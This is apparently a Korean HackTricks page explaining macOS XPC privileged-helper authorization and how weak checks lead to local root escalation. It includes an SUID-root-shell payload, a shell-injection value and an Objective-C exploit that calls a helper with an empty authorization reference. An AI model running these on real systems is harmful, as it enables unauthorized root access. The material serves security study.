# macOS XPC 권한

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC 권한

Apple는 연결하는 프로세스가 **노출된 XPC 메서드를 호출할 권한**이 있는지 확인하는 또 다른 인증 방법을 제안한다.

애플리케이션이 **권한 있는 사용자로서 작업을 실행해야 할 때**, 해당 앱을 권한 있는 사용자로 실행하는 대신 보통 root로 HelperTool을 XPC 서비스로 설치해 앱에서 해당 서비스를 호출해 작업을 수행하게 한다. 하지만 그 서비스를 호출하는 앱은 충분한 권한이 있어야 한다.

### ShouldAcceptNewConnection 항상 YES

예제는 [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample)에서 찾을 수 있다. `App/AppDelegate.m`에서는 **HelperTool에 연결하려고 시도한다**. 그리고 `HelperTool/HelperTool.m`에서 함수 **`shouldAcceptNewConnection`**는 앞서 언급한 요구사항들을 전혀 **확인하지 않는다**. 항상 YES를 반환한다:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
더 자세한 설정 방법은 다음을 참조하세요:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### 애플리케이션 권한

하지만 **HelperTool의 메서드가 호출될 때 일부 authorization이 발생합니다**.

앱이 시작된 후 `App/AppDelegate.m`의 함수 **`applicationDidFinishLaunching`**는 빈 authorization 참조를 생성합니다. 이는 항상 작동해야 합니다.\
그런 다음, `setupAuthorizationRights`를 호출하여 해당 authorization 참조에 **몇 가지 권한을 추가하려고 시도합니다**:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
`Common/Common.m`의 `setupAuthorizationRights` 함수는 auth database `/var/db/auth.db`에 애플리케이션의 권한을 저장합니다. 데이터베이스에 아직 없는 권한만 추가하는 방식에 주목하세요:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
애플리케이션 권한을 가져오는 데 사용되는 함수는 `enumerateRightsUsingBlock`이며, 해당 권한들은 `commandInfo`에 정의되어 있습니다:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
이것은 이 프로세스가 끝나면 `commandInfo` 안에 선언된 권한들이 `/var/db/auth.db`에 저장된다는 것을 의미합니다. 그곳에서 **각 메서드** 중 **인증을 요구하는** 항목에 대해 **권한 이름**과 **`kCommandKeyAuthRightDefault`** 를 확인할 수 있습니다. 후자는 **누가 이 권한을 얻을 수 있는지**를 나타냅니다.

권한에 누가 접근할 수 있는지를 나타내는 여러 스코프가 있습니다. 일부는 [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)에 정의되어 있습니다 (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), 요약하면:

<table><thead><tr><th width="284.3333333333333">이름</th><th width="165">값</th><th>설명</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>누구나</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>아무도 없음</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>현재 사용자가 admin(관리자) 그룹에 속해 있어야 함</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>사용자에게 인증을 요청합니다.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>사용자에게 인증을 요청합니다. 사용자는 admin(관리자) 그룹에 속해 있어야 합니다.</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>규칙을 지정</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>권한에 대한 추가 설명을 지정</td></tr></tbody></table>

### 권한 검증

`HelperTool/HelperTool.m` 파일에서 함수 **`readLicenseKeyAuthorization`** 는 호출자가 해당 메서드를 **실행할 권한이 있는지** 를 **`checkAuthorization`** 함수를 호출해 확인합니다. 이 함수는 호출 프로세스가 보낸 **authData** 가 **올바른 형식**인지 검사하고, 특정 메서드를 호출하기 위해 **어떤 조건이 필요한지** 확인합니다. 모든 것이 정상이라면 **반환되는 `error`는 `nil`** 입니다:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
참고로 해당 메서드를 호출할 권한을 얻기 위한 **요구사항을 확인하려면** 함수 `authorizationRightForCommand`는 앞서 설명한 객체 **`commandInfo`**만 확인합니다. 그런 다음, 함수 호출 권한이 있는지 확인하기 위해 **`AuthorizationCopyRights`**를 호출합니다(플래그가 사용자와의 상호작용을 허용한다는 점에 유의하세요).

이 경우 `readLicenseKeyAuthorization`를 호출하기 위해 `kCommandKeyAuthRightDefault`가 `@kAuthorizationRuleClassAllow`로 정의되어 있습니다. 따라서 **누구나 호출할 수 있습니다**.

### DB 정보

이 정보는 `/var/db/auth.db`에 저장된다고 언급되었습니다. 저장된 모든 규칙은 다음 명령으로 나열할 수 있습니다:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
그런 다음, 누가 해당 권한에 접근할 수 있는지 다음과 같이 확인할 수 있습니다:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### 허용 권한

You can find **모든 권한 설정** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/), but the combinations that won't require user interaction would be:

1. **'authenticate-user': 'false'**
- 이것이 가장 직접적인 키입니다. 만약 `false`로 설정되면, 사용자가 이 권한을 얻기 위해 인증을 제공할 필요가 없음을 의미합니다.
- 이는 **아래의 둘 중 하나와 결합되거나 사용자가 속해야 하는 그룹을 지정할 때** 사용됩니다.
2. **'allow-root': 'true'**
- 사용자가 root user(더 높은 권한을 가진)로 동작 중이고, 이 키가 `true`로 설정되어 있으면, root user는 추가 인증 없이 이 권한을 얻을 수 있습니다. 그러나 일반적으로 root user 상태에 도달하려면 이미 인증이 필요하므로, 대부분의 사용자에게 이것이 '인증 없음' 시나리오인 것은 아닙니다.
3. **'session-owner': 'true'**
- `true`로 설정되면, 세션의 소유자(현재 로그인한 사용자)가 자동으로 이 권한을 얻게 됩니다. 사용자가 이미 로그인되어 있다면 추가 인증을 우회할 수 있습니다.
4. **'shared': 'true'**
- 이 키는 인증 없이 권한을 부여하지 않습니다. 대신 `true`로 설정되면, 권한이 한 번 인증되면 각 프로세스가 다시 인증할 필요 없이 여러 프로세스 간에 공유될 수 있음을 의미합니다. 그러나 권한의 최초 부여는 `'authenticate-user': 'false'` 같은 다른 키와 결합되지 않는 한 여전히 인증을 요구합니다.

흥미로운 권한을 얻으려면 [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9)를 사용할 수 있습니다:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### 권한 우회 사례 연구

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: 권한 있는 Mach 서비스 `com.acustica.HelperTool`은 모든 연결을 수락하며, 그 `checkAuthorization:` 루틴은 `AuthorizationCopyRights(NULL, …)`를 호출하므로, 임의의 32‑byte blob이 통과합니다. `executeCommand:authorization:withReply:`는 attacker-controlled comma‑separated strings를 root로 `NSTask`에 전달하여, 예를 들어 다음과 같은 페이로드를 만듭니다:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
간단히 SUID 루트 셸을 생성할 수 있습니다. 자세한 내용은 [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: 리스너는 항상 YES를 반환하며 동일한 NULL `AuthorizationCopyRights` 패턴이 `checkAuthorization:`에 나타납니다. `exchangeAppWithReply:` 메서드는 공격자 입력을 `system()` 문자열에 두 번 연결하므로 `appPath`에 셸 메타문자를 주입하면(예: `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) Mach 서비스 `com.plugin-alliance.pa-installationhelper`를 통해 루트 코드 실행이 발생합니다. 자세한 정보는 [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).
- **CVE-2024-4395 – Jamf Compliance Editor helper**: 감사 실행 시 `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`가 떨어지고 Mach 서비스 `com.jamf.complianceeditor.helper`가 노출되며 호출자의 `AuthorizationExternalForm`이나 코드 서명을 검증하지 않은 채 `-executeScriptAt:arguments:then:`를 내보냅니다. 사소한 익스플로잇은 빈 참조를 `AuthorizationCreate`하고 `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]`로 연결한 후 해당 메서드를 호출해 임의의 바이너리를 루트로 실행하게 합니다. 전체 리버싱 노트(및 PoC)는 [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)에 있습니다.
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 및 7.4.0–7.4.2는 권한 검증이 없는 특권 helper에 도달하는 조작된 XPC 메시지를 수락했습니다. helper가 자체 특권 `AuthorizationRef`를 신뢰했기 때문에 서비스에 메시지를 보낼 수 있는 로컬 사용자는 이를 강제하여 임의의 구성 변경이나 명령을 루트로 실행할 수 있었습니다. 세부사항은 [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)에 있습니다.

#### Rapid triage tips

- 앱이 GUI와 helper를 함께 제공할 때, 둘의 code requirements를 비교(diff)하고 `shouldAcceptNewConnection`가 리스너를 `-setCodeSigningRequirement:`로 잠그는지(또는 `SecCodeCopySigningInformation`을 검증하는지) 확인하세요. 검증 누락은 보통 Jamf 사례와 같은 CWE-863 시나리오를 초래합니다. 간단히 살펴보면 다음과 같습니다:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- 헬퍼가 *권한을 부여한다고 생각하는 것*과 클라이언트가 제공하는 것을 비교하세요. 역분석 시 `AuthorizationCopyRights`에서 중단하고 `AuthorizationRef`가 헬퍼의 자체 권한 있는 컨텍스트가 아닌 클라이언트가 제공한 `AuthorizationCreateFromExternalForm`에서 유래했는지 확인하세요. 그렇지 않으면 위의 사례들과 유사한 CWE-863 패턴을 찾았을 가능성이 높습니다.

## 권한 역분석

### Checking if EvenBetterAuthorization is used

함수를 찾으면: **`[HelperTool checkAuthorization:command:]`** 아마도 해당 프로세스는 앞서 언급한 권한부여 스키마를 사용하고 있을 것입니다:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

이 경우, 만약 이 함수가 `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` 같은 함수를 호출한다면, [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154)를 사용하고 있는 것입니다.

사용자 상호작용 없이 일부 권한 있는 동작을 호출할 수 있는 권한을 얻을 수 있는지 확인하려면 **`/var/db/auth.db`**를 확인하세요.

### 프로토콜 통신

그런 다음 XPC 서비스와 통신을 설정할 수 있도록 프로토콜 스키마를 찾아야 합니다.

함수 **`shouldAcceptNewConnection`**는 내보내는 프로토콜을 나타냅니다:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

In this case, we have the same as in EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

사용된 프로토콜 이름을 알면, 다음으로 **헤더 정의를 덤프**할 수 있습니다:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
마지막으로, 해당 Mach Service와 통신을 설정하려면 **노출된 Mach Service의 이름**만 알면 됩니다. 이를 찾는 방법은 여러 가지가 있습니다:

- **`[HelperTool init]`**에서 Mach Service가 사용되는 것을 확인할 수 있습니다:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist에서:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit 예제

이 예제에서는 다음이 생성됩니다:

- 함수들이 포함된 프로토콜의 정의
- 액세스를 요청하는 데 사용할 빈 auth
- XPC 서비스에 대한 연결
- 연결이 성공한 경우 함수 호출
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## 다른 XPC 권한 도우미의 악용

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## 참고자료

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)

{{#include ../../../../../banners/hacktricks-training.md}}
